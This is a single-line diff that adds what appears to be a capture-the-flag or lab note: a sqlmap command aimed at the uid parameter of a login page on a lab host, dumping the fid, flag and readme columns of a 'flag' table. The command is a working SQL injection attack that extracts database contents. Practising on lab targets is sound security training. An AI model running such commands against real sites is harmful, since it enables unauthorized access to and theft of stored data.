@@ -1,0 +1,1 @@
+lab.hackerinside.xyz/login.php?uid=admin (GET)  # /usr/bin/sqlmap -u lab.hackerinside.xyz/login.php?uid=admin -D dbs -T flag -C fid,flag,readme --dump
